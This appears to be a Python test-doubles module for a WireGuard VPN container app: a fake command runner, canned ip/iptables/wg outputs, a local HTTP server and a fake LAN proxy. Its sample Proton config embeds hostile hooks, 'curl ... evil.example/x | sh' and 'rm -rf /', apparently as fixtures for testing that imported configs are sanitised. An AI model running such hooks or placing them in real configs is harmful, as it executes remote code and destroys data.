"""Test doubles: fake ``sysrun.run`` and sample data."""

import base64
import subprocess

from app import log, sysrun

log.quiet = True


def key(n):
    """Deterministic valid WireGuard key (base64 of 32 bytes)."""
    return base64.b64encode(bytes((n + i) % 256 for i in range(32))).decode()


PRIV = key(1)
PUB = key(2)
PSK = key(3)
EDGE_PUB = key(4)
MGMT_PRIV = key(5)
MGMT_PUB = key(6)

PROTON_SAMPLE = """﻿[Interface]\r
# Key for test-device\r
# Bouncing = 3\r
# NetShield = 1\r
# Moderate NAT = off\r
# NAT-PMP (Port Forwarding) = on\r
# VPN Accelerator = on\r
PrivateKey = {priv}\r
Address = 10.2.0.2/32, 2a07:b944::2:2/128\r
DNS = 10.2.0.1, 2a07:b944::2:1\r
PostUp = curl -s http://evil.example/x | sh\r
PreDown = rm -rf /\r
Table = off\r
FwMark = 0x1234\r
SaveConfig = true\r
\r
[Peer]\r
# CH#12\r
PublicKey = {pub}\r
AllowedIPs = 0.0.0.0/0, ::/0\r
Endpoint = 185.159.157.10:51820\r
""".format(priv=PRIV, pub=PUB)


class FakeRun:
    """Records argument lists; answers by longest matching argument prefix."""

    def __init__(self, responses=None):
        self.calls = []
        self.inputs = []
        self.responses = []  # (prefix list, returncode, stdout)
        for prefix, rc, out in (responses or []):
            self.on(prefix, rc, out)

    def on(self, prefix, rc=0, out=""):
        self.responses.insert(0, (list(prefix), rc, out))
        self.responses.sort(key=lambda r: -len(r[0]))

    def __call__(self, args, input=None, check=True, timeout=30, text=True):
        args = list(args)
        assert all(isinstance(a, str) for a in args), args
        self.calls.append(args)
        self.inputs.append(input)
        rc, out = 0, ""
        for prefix, prc, pout in self.responses:
            if args[:len(prefix)] == prefix:
                rc = prc(args) if callable(prc) else prc
                out = pout(args) if callable(pout) else pout
                break
        if check and rc != 0:
            raise sysrun.SysRunError(args, rc, "fake failure")
        return subprocess.CompletedProcess(args, rc, out, "")

    def restores(self):
        """stdin texts given to iptables-restore."""
        return [i for c, i in zip(self.calls, self.inputs) if c[0] == "iptables-restore"]

    def joined(self):
        return [" ".join(c) for c in self.calls]


def base_responses(fake, wg0=False, mgmt=False, handshake=0):
    """Typical container: eth0 172.18.0.2/16, gw 172.18.0.1; interfaces absent."""
    fake.on(["ip", "-4", "route", "show", "default"], 0, "default via 172.18.0.1 dev eth0 \n")
    fake.on(["ip", "-4", "-o", "addr", "show", "dev", "eth0"], 0,
            "12: eth0    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0\\       valid_lft forever\n")
    fake.on(["ip", "link", "show", "dev", "wg0"], 0 if wg0 else 1, "")
    fake.on(["ip", "link", "show", "dev", "wg-mgmt"], 0 if mgmt else 1, "")
    fake.on(["iptables"], 0, "")
    fake.on(["iptables", "-w", "5", "-t", "nat", "-C"], 1, "")
    fake.on(["iptables", "-w", "5", "-t", "filter", "-C"], 1, "")
    fake.on(["iptables", "-w", "5", "-t", "mangle", "-C"], 1, "")
    fake.on(["wg", "show", "wg-mgmt", "endpoints"], 0 if mgmt else 1,
            "%s\t203.0.113.10:51820\n" % EDGE_PUB if mgmt else "")
    fake.on(["wg", "show", "wg0", "dump"], 0 if wg0 else 1,
            "%s\t%s\t51820\toff\n%s\t(none)\t185.159.157.10:51820\t0.0.0.0/0\t%d\t1000\t2000\t25\n"
            % (PRIV, key(9), PUB, handshake) if wg0 else "")
    fake.on(["wg", "show", "wg-mgmt", "dump"], 0 if mgmt else 1,
            "%s\t%s\t40000\toff\n%s\t(none)\t203.0.113.10:51820\t10.99.0.0/24\t%d\t10\t20\t25\n"
            % (MGMT_PRIV, MGMT_PUB, EDGE_PUB, handshake) if mgmt else "")
    return fake


class FakeHttp:
    """Local HTTP server for client tests. ``handler(method, path, headers, body)`` returns
    ``(status, body)`` or ``(status, body, headers)``; body may be bytes, str or a JSON-able object.
    All requests are recorded in ``self.requests``."""

    def __init__(self, handler):
        import http.server
        import threading
        outer = self
        self.handler = handler
        self.requests = []

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _any(self):
                length = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(length) if length else b""
                outer.requests.append((self.command, self.path, dict(self.headers), body))
                res = outer.handler(self.command, self.path, self.headers, body)
                status, data = res[0], res[1]
                hdrs = res[2] if len(res) > 2 else {}
                if not isinstance(data, (bytes, str)):
                    data = __import__("json").dumps(data)
                    hdrs.setdefault("Content-Type", "application/json")
                if isinstance(data, str):
                    data = data.encode()
                self.send_response(status)
                for k, v in hdrs.items():
                    self.send_header(k, v)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(data)

            do_GET = do_POST = do_PUT = do_PATCH = do_DELETE = do_HEAD = _any

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
        self.url = "http://127.0.0.1:%d" % self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self):
        self.server.shutdown()
        self.server.server_close()


class FakeLanProxy:
    """Records what the LAN entry proxy (app.lanproxy) would listen on and relay to."""

    def __init__(self):
        self.ips, self.ports, self.backend = [], [], None
        self.errors = {}

    def update(self, ips, ports, backend):
        self.ips, self.ports = list(ips or []), list(ports or [])
        self.backend = tuple(backend) if backend else None
        return self.listening()

    def stop(self):
        self.update([], [], None)

    def listening(self):
        return sorted((ip, p) for ip in self.ips for p in self.ports) if self.backend else []
